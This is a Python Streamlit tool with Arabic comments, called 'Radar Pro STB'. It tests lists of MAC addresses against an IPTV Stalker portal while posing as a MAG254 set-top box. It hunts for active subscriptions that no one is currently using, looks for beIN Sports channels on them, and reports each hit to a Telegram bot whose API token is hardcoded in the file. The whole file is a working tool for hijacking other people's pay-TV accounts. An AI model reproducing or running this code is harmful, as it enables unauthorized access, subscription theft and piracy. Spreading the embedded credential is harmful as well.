import streamlit as st
import requests
import time
import telebot
import random
import re
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ 🔑 بيانات البوت ============
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# ============ 📺 القنوات المستهدفة ============
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"],
}

# ============ 🎨 تحسين الواجهة ============
st.set_page_config(page_title="Radar Pro - STB Checker", layout="wide")

st.markdown("""
<style>
    .main-header { text-align: center; background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); 
    padding: 1.5rem; border-radius: 15px; color: white; margin-bottom: 2rem; }
    .stTextArea textarea { font-family: monospace; }
</style>
<div class="main-header">
    <h1>📡 Radar Pro STB</h1>
    <p>نظام الفحص المتوازي واصطياد الماكات</p>
</div>
""", unsafe_allow_html=True)

# وظيفة لتنظيف النص
def clear_text():
    st.session_state["input_area"] = ""

# ============ ⚙️ محرك الفحص ============
def check_mac_logic(host, mac, timeout):
    try:
        headers = {
            'User-Agent': 'MAG254/2.2.0 (Qt; Linux; C) stbapp ver: 2 rev: 250',
            'Cookie': f'mac={mac}'
        }
        base_url = f"http://{host}/portal.php"
        
        # فحص البروفايل
        start = time.time()
        r = requests.get(f"{base_url}?type=stb&action=get_profile&force_stb=1", headers=headers, timeout=timeout)
        latency = (time.time() - start) * 1000
        
        if r.status_code == 200:
            data_text = r.text
            active = re.search(r'"active_cons"\s*:\s*"(\d+)"', data_text)
            active_val = int(active.group(1)) if active else 1
            
            exp = re.search(r'"end_date"\s*:\s*"([^"]+)"', data_text)
            exp_val = exp.group(1) if exp else "غير محدد"
            
            if active_val == 0:
                # فحص القنوات
                r_ch = requests.get(f"{base_url}?type=itv&action=get_all_channels", headers=headers, timeout=timeout)
                ch_text = r_ch.text.upper()
                found = [n for n, keys in CHANNELS_KEYS.items() if all(k in ch_text for k in keys)]
                
                return {
                    'mac': mac, 'status': 'AVAILABLE', 'latency': f"{int(latency)}ms",
                    'active': 0, 'expiry': exp_val, 'channels': found
                }
            return {'mac': mac, 'status': 'BUSY', 'active': active_val, 'expiry': exp_val}
    except:
        pass
    return {'mac': mac, 'status': 'OFFLINE'}

# ============ 🖥️ واجهة المستخدم ============

# إنشاء صندوق النص باستخدام Session State
if "input_area" not in st.session_state:
    st.session_state["input_area"] = ""

input_data = st.text_area("🚀 أدخل البيانات (رابط + ماكات):", 
                          value=st.session_state["input_area"], 
                          key="input_area", 
                          height=200)

col_btns1, col_btns2 = st.columns([3, 1])

with col_btns1:
    btn_start = st.button("🏁 ابدأ المسح الشامل", type="primary", use_container_width=True)

with col_btns2:
    btn_clear = st.button("🗑️ تنظيف الحقول", on_click=clear_text, use_container_width=True)

st.divider()

col_cfg1, col_cfg2 = st.columns(2)
with col_cfg1:
    threads = st.slider("👥 عدد الخيوط (السرعة)", 1, 30, 15)
with col_cfg2:
    timeout_sec = st.slider("⏱️ مهلة الانتظار (ثواني)", 3, 15, 7)

# منطق التشغيل
if btn_start:
    if input_data:
        found_macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_data)
        
        if host_match and found_macs:
            host = host_match.group(0).split('/portal.php')[0].replace("http://", "").replace("https://", "").strip("/")
            st.info(f"🌐 جاري العمل على سيرفر: {host} | 🎯 عدد الماكات: {len(found_macs)}")
            
            progress = st.progress(0)
            results = []
            placeholder = st.empty()
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(check_mac_logic, host, m, timeout_sec): m for m in found_macs}
                
                for i, future in enumerate(as_completed(futures)):
                    res = future.result()
                    if res['status'] == 'AVAILABLE':
                        results.append(res)
                        # إشعار تلغرام
                        msg = f"🎯 **صيد جديد**\n🖥️ الماك: `{res['mac']}`\n📅 ينتهي: {res['expiry']}\n📊 الاستقرار: {res['latency']}\n📺 القنوات: {', '.join(res['channels'])}"
                        bot.send_message(ID, msg, parse_mode="Markdown")
                        st.success(f"✅ متاح: {res['mac']}")
                    
                    progress.progress((i + 1) / len(found_macs))

            if results:
                st.divider()
                st.subheader("📊 النتائج النهائية")
                st.dataframe(pd.DataFrame(results), use_container_width=True)
                st.balloons()
            else:
                st.warning("📭 لم يتم العثور على ماكات فارغة في هذه الدورة.")
        else:
            st.error("❌ تأكد من إدخال رابط صحيح وقائمة ماكات.")
    else:
        st.warning("⚠️ الرجاء إدخال البيانات أولاً.")
